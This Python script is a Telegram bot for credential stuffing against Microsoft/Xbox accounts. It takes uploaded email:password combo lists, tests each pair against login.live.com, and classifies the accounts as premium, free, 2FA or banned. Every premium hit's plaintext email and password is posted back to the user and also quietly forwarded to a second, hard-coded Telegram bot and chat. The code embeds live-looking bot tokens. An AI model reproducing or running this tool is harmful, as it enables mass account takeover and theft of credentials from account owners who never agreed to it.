#!/usr/bin/env python3
"""
Xbox Premium Checker Bot - Pure Requests (No Telethon)
No session files, no complex dependencies - just works
"""

import os
import re
import time
import json
import sqlite3
import logging
import requests
import asyncio
from datetime import datetime
from threading import Lock
from typing import List, Optional

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============================================================
# CONFIGURATION
# ============================================================

COMMAND_BOT_TOKEN = "8666320518:AAEIhkSS0XeJ-k40rc3d80Dn0b-q9JLcnyI"
TARGET_BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
TARGET_CHAT_ID = "8260250818"

DATA_DIR = "/app/data" if os.path.exists("/app") else "data"
os.makedirs(DATA_DIR, exist_ok=True)

CONFIG_FILE = os.path.join(DATA_DIR, "config.json")
DB_FILE = os.path.join(DATA_DIR, "forwarded.db")

logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================================
# DATABASE
# ============================================================

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS processed_files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        file_id TEXT UNIQUE,
        file_name TEXT,
        processed_at TIMESTAMP
    )''')
    conn.commit()
    conn.close()

def is_file_processed(file_id: str) -> bool:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id FROM processed_files WHERE file_id = ?", (file_id,))
    result = c.fetchone()
    conn.close()
    return result is not None

def mark_file_processed(file_id: str, file_name: str):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        "INSERT OR IGNORE INTO processed_files (file_id, file_name, processed_at) VALUES (?, ?, ?)",
        (file_id, file_name, datetime.now().isoformat())
    )
    conn.commit()
    conn.close()

# ============================================================
# XBOX CHECKER (Pure Requests - No Telethon)
# ============================================================

class XboxChecker:
    def __init__(self):
        self.session = requests.Session()
    
    def check(self, email: str, password: str) -> dict:
        try:
            # Step 1: Get login page
            login_url = "https://login.live.com/login.srf"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            }
            resp = self.session.get(login_url, headers=headers, timeout=15)
            
            # Extract PPFT and login URL
            ppft_match = re.search(r'name="PPFT" value="([^"]+)"', resp.text)
            url_post_match = re.search(r'urlPost:"([^"]+)"', resp.text)
            
            if not ppft_match or not url_post_match:
                return {"status": "BAD", "data": {}}
            
            ppft = ppft_match.group(1)
            post_url = url_post_match.group(1).replace("\\/", "/")
            
            # Step 2: Login POST
            login_data = {
                "login": email,
                "loginfmt": email,
                "passwd": password,
                "PPFT": ppft,
                "PPSX": "PassportR",
                "type": "11",
                "LoginOptions": "1",
                "NewUser": "1"
            }
            
            resp = self.session.post(post_url, data=login_data, headers=headers, allow_redirects=False, timeout=15)
            
            # Check response
            if resp.status_code == 302:
                location = resp.headers.get("Location", "")
                
                if "live.com/me" in location or "outlook.com" in location:
                    # Check if has Xbox subscription
                    sub_status = self.check_xbox_subscription()
                    if sub_status:
                        return {"status": "PREMIUM", "data": {"premium_type": "XBOX GAME PASS", "days_remaining": "30"}}
                    return {"status": "FREE", "data": {}}
                
                elif "auth/confirm" in location:
                    return {"status": "2FACTOR", "data": {}}
                elif "Abuse" in location:
                    return {"status": "BANNED", "data": {}}
            
            # Check for error messages
            if "incorrect" in resp.text.lower() or "error" in resp.text.lower():
                return {"status": "BAD", "data": {}}
            
            return {"status": "BAD", "data": {}}
            
        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT", "data": {}}
        except Exception as e:
            logger.error(f"Check error: {e}")
            return {"status": "ERROR", "data": {}}
    
    def check_xbox_subscription(self):
        """Check if logged-in account has Xbox subscription"""
        try:
            url = "https://account.microsoft.com/services/"
            resp = self.session.get(url, timeout=10)
            if "Game Pass" in resp.text or "Xbox" in resp.text:
                return True
        except:
            pass
        return False

# ============================================================
# FILE PROCESSING
# ============================================================

processing_queue = []
processing_active = False
processing_lock = Lock()

async def send_premium_hit(email: str, password: str, update_obj):
    """Send premium hit to Telegram"""
    msg = (
        f"🎮 **PREMIUM HIT!**\n\n"
        f"📧 `{email}`\n"
        f"🔑 `{password}`\n\n"
        f"✨ **Account is valid with Xbox access!**"
    )
    await update_obj.message.reply_text(msg, parse_mode='Markdown')
    
    # Also send to target bot
    try:
        url = f"https://api.telegram.org/bot{TARGET_BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': TARGET_CHAT_ID,
            'text': msg,
            'parse_mode': 'Markdown'
        }
        requests.post(url, data=data, timeout=10)
    except:
        pass

async def process_file(file_path: str, file_name: str, file_id: str, update_obj):
    """Process a single file"""
    global processing_active
    
    try:
        # Read accounts
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
        
        if not lines:
            await update_obj.message.reply_text(f"❌ No valid accounts in {file_name}")
            return
        
        stats = {
            "total": len(lines),
            "checked": 0,
            "premium": 0,
            "free": 0,
            "bad": 0,
            "two_factor": 0,
            "banned": 0,
            "errors": 0
        }
        
        premium_accounts = []
        batch_results = []
        BATCH_SIZE = 10
        
        await update_obj.message.reply_text(
            f"🚀 **Checking:** {file_name}\n📊 **Total:** {stats['total']} accounts\n\n⏳ Starting scan...",
            parse_mode='Markdown'
        )
        
        checker = XboxChecker()
        
        for idx, line in enumerate(lines, 1):
            try:
                email, password = line.split(':', 1)
                email = email.strip()
                password = password.strip()
                
                result = checker.check(email, password)
                status = result['status']
                
                result_line = f"{idx}. {email[:30]}..."
                
                if status == "PREMIUM":
                    stats["premium"] += 1
                    premium_accounts.append(f"{email}:{password}")
                    result_line += " ✅ PREMIUM"
                    batch_results.append(result_line)
                    await send_premium_hit(email, password, update_obj)
                    
                elif status == "FREE":
                    stats["free"] += 1
                    result_line += " 🆓 FREE"
                    batch_results.append(result_line)
                    
                elif status == "2FACTOR":
                    stats["two_factor"] += 1
                    stats["bad"] += 1
                    result_line += " 🔐 2FA"
                    batch_results.append(result_line)
                    
                elif status == "BANNED":
                    stats["banned"] += 1
                    stats["bad"] += 1
                    result_line += " 🚫 BANNED"
                    batch_results.append(result_line)
                    
                else:
                    stats["bad"] += 1
                    result_line += " ❌ BAD"
                    batch_results.append(result_line)
                
                stats["checked"] += 1
                
                # Send batch update
                if len(batch_results) >= BATCH_SIZE:
                    progress = f"📊 **Progress:** {stats['checked']}/{stats['total']}\n"
                    progress += f"✅ Premium: {stats['premium']} | 🆓 Free: {stats['free']} | ❌ Bad: {stats['bad']}\n\n"
                    progress += "```\n" + "\n".join(batch_results) + "\n```"
                    await update_obj.message.reply_text(progress, parse_mode='Markdown')
                    batch_results.clear()
                
                # Small delay to avoid rate limiting
                await asyncio.sleep(0.2)
                
            except Exception as e:
                stats["errors"] += 1
                stats["bad"] += 1
                stats["checked"] += 1
                logger.error(f"Line error: {e}")
        
        # Send final results
        final_msg = (
            f"✅ **SCAN COMPLETE**\n\n"
            f"📄 **File:** `{file_name}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔢 **Total:** `{stats['total']}`\n"
            f"✅ **PREMIUM:** `{stats['premium']}`\n"
            f"🆓 **FREE:** `{stats['free']}`\n"
            f"❌ **BAD:** `{stats['bad']}`\n"
            f"🔐 **2FA:** `{stats['two_factor']}`\n"
            f"🚫 **BANNED:** `{stats['banned']}`\n"
            f"⚠️ **ERRORS:** `{stats['errors']}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
        )
        await update_obj.message.reply_text(final_msg, parse_mode='Markdown')
        
        # Send all premium accounts
        if premium_accounts:
            premium_text = "\n".join(premium_accounts[:20])
            if len(premium_accounts) > 20:
                premium_text += f"\n... and {len(premium_accounts) - 20} more"
            
            await update_obj.message.reply_text(
                f"🎮 **PREMIUM ACCOUNTS ({stats['premium']})**\n\n```\n{premium_text}\n```",
                parse_mode='Markdown'
            )
        
        # Mark as processed
        mark_file_processed(file_id, file_name)
        
    except Exception as e:
        logger.error(f"Process error: {e}")
        await update_obj.message.reply_text(f"❌ Error processing {file_name}: {str(e)}")
    
    finally:
        # Cleanup temp file
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
            except:
                pass
        
        # Process next file
        with processing_lock:
            processing_active = False
            if processing_queue:
                next_item = processing_queue.pop(0)
                asyncio.create_task(process_file(next_item[0], next_item[1], next_item[2], next_item[3]))

# ============================================================
# TELEGRAM COMMANDS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🎮 **Xbox Premium Checker Bot**\n\n"
        "Send a `.txt` file with accounts in `email:password` format\n\n"
        "**Supported formats:**\n"
        "• `email:password`\n"
        "• `email@domain.com:password`\n\n"
        "**Results:**\n"
        "• Premium hits sent instantly\n"
        "• Batch updates every 10 accounts\n"
        "• Final summary with all results\n\n"
        "**Commands:**\n"
        "/start - This message\n"
        "/status - Check queue"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with processing_lock:
        queue_size = len(processing_queue)
        is_active = processing_active
    
    msg = f"📊 **Queue Status**\n\n"
    msg += f"🔄 **Processing:** {'Yes' if is_active else 'No'}\n"
    msg += f"⏳ **Queue Size:** {queue_size}\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global processing_active
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a `.txt` file.")
        return
    
    # Check if already processed
    if is_file_processed(str(document.file_id)):
        await update.message.reply_text(f"⚠️ File `{document.file_name}` already processed.", parse_mode='Markdown')
        return
    
    # Download file
    file = await context.bot.get_file(document.file_id)
    temp_path = f"/tmp/{document.file_name}"
    await file.download_to_drive(temp_path)
    
    # Validate file
    with open(temp_path, 'r', encoding='utf-8') as f:
        lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
    
    if not lines:
        await update.message.reply_text(f"❌ No valid `email:password` lines in {document.file_name}", parse_mode='Markdown')
        os.remove(temp_path)
        return
    
    await update.message.reply_text(
        f"✅ **File Accepted**\n\n"
        f"📄 `{document.file_name}`\n"
        f"🔢 **Accounts:** {len(lines)}\n"
        f"📊 **Queue Position:** {len(processing_queue) + 1}\n\n"
        f"🔄 Processing will start automatically...",
        parse_mode='Markdown'
    )
    
    # Add to queue
    with processing_lock:
        processing_queue.append((temp_path, document.file_name, str(document.file_id), update))
        
        if not processing_active:
            processing_active = True
            first = processing_queue.pop(0)
            asyncio.create_task(process_file(first[0], first[1], first[2], first[3]))

# ============================================================
# MAIN
# ============================================================

async def main():
    init_db()
    
    app = Application.builder().token(COMMAND_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    logger.info("🤖 Xbox Checker Bot started!")
    print("\n" + "="*50)
    print("🎮 XBOX PREMIUM CHECKER BOT")
    print("="*50)
    print("Bot is running!")
    print("Send .txt files to check accounts")
    print("="*50 + "\n")
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        pass
    finally:
        await app.stop()

if __name__ == "__main__":
    asyncio.run(main())
